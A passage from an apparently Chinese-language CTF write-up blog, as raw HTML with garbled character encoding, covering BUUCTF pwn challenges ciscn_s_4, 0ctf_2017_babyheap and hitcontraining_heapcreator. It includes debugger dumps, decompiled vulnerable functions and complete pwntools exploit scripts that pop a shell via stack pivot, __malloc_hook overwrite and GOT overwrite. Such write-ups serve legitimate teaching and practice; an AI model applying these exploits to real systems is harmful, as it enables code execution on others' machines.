]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line"> â–º 0x80484b9 &lt;deregister_tm_clones+41&gt;    ret             &lt;0x8048400; system@plt&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    â†“</span><br><span class="line">   0x80483c0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x80483c6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffffd070 â€”â–¸ 0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]</span><br><span class="line">01:0004â”‚      0xffffd074 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">02:0008â”‚      0xffffd078 â€”â–¸ 0xffffd07c â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">03:000câ”‚      0xffffd07c â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">04:0010â”‚      0xffffd080 â—‚â€” 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">05:0014â”‚      0xffffd084 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ„é€ payloadä¸­çš„retåï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0xf7fb7d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line"> ESP  0xffffd074 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EIP  0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80485fc  &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd  &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe  &lt;vul+105&gt;                    ret    </span><br><span class="line">    â†“</span><br><span class="line">   0x80484b8  &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9  &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    â†“</span><br><span class="line"> â–º 0x8048400  &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406  &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b  &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    â†“</span><br><span class="line">   0x80483c0                               push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x80483c6                               jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;        push   eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffffd074 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">01:0004â”‚      0xffffd078 â€”â–¸ 0xffffd07c â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">02:0008â”‚      0xffffd07c â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">03:000câ”‚      0xffffd080 â—‚â€” 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">04:0010â”‚      0xffffd084 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27655</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./ciscn_s_4&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_s_4&quot;</span>)</span><br><span class="line">sys_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">buf_add = ebp - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">payload = p32(sys_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(buf_add+<span class="number">12</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;a&#x27;</span> + p32(buf_add-<span class="number">4</span>) + p32(leave)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;aaaa&#x27;+p32(sys_addr) + &#x27;aaaa&#x27; + p32(buf_add+16) + b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment">#payload += (0x28 - len(payload))* b&#x27;a&#x27; + p32(buf_add) + p32(leave)</span></span><br><span class="line"><span class="comment">#ä¸¤ä¸ªpayloadéƒ½å¯ä»¥ï¼Œæ„æ€éƒ½ä¸€æ ·</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3B-0ctf-2017-babyheap"><a href="#0x3B-0ctf-2017-babyheap" class="headerlink" title="0x3B.0ctf_2017_babyheap"></a>0x3B.0ctf_2017_babyheap</h1><p>è¿™é¢˜é‡å¤äº†ï¼Œå‰é¢æœ‰ä¸ªä¸€æ ·çš„ã€‚</p><p>å½“unsortedbinåªæœ‰ä¸€ä¸ªæ—¶ï¼Œä»–çš„fdå’ŒbkæŒ‡å‘<code>main_arena + 0x58</code>ï¼Œè€Œä¸” main_arena åˆç›¸å¯¹ libc å›ºå®šåç§» 0x3c4b20ï¼Œæ‰€ä»¥å¾—åˆ°çš„å†…å®¹å‡å»0x3c4b78å°±æ˜¯libcçš„åŸºåœ°å€</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./0ctf_2017_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26377</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)<span class="comment">#allocate</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)<span class="comment">#free</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#5 topchunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) +p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#1 --&gt;2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#2 --&gt;4</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: \n&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) -  <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> +p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3C-hitcontraining-heapcreator"><a href="#0x3C-hitcontraining-heapcreator" class="headerlink" title="0x3C.hitcontraining_heapcreator"></a>0x3C.hitcontraining_heapcreator</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;heaparray)[i] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = (&amp;heaparray)[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;heaparray)[i] = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input((&amp;heaparray)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”³è¯·çš„é¦–ä¸ª0x10ï¼Œå‰0x8æ”¾sizeï¼ŒååŠéƒ¨åˆ†æ”¾ç”³è¯·çš„sizeçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input((&amp;heaparray)[v1][<span class="number">1</span>], *(&amp;heaparray)[v1] + <span class="number">1</span>);<span class="comment">//è¿™é‡Œå­˜åœ¨off by one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1][<span class="number">1</span>]);<span class="comment">//free mallocsize)</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1]); <span class="comment">//free 0x10</span></span><br><span class="line">    (&amp;heaparray)[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯ï¼šåˆ©ç”¨editçš„off by one ï¼Œè¦†å†™sizeï¼Œç„¶åfreeæ‰ï¼Œå†ç”³è¯·ï¼Œå¡«å……payloadï¼Œå°†freeçš„gotæ‰“å°å‡ºæ¥ï¼Œè¦†å†™freeçš„åœ°å€ä¸ºsystemçš„åœ°å€ï¼Œç„¶ådeleteå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¦†å†™æ‰ç¬¬äºŒæ¬¡çš„0x10çš„sizeä½ä¸º0x81;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">8</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_add = u64(io.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>å°†freeçš„åœ°å€æ‰“å°å‡ºæ¥ï¼›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(system_add))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å°†mallocçš„åœ°å€çš„åœ°å€æ”¹ä¸ºsystemçš„åœ°å€ï¼Œå†ä¹‹åfreeçš„æ—¶å€™å°±è½¬ä¸ºæ‰§è¡Œsystem.</p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 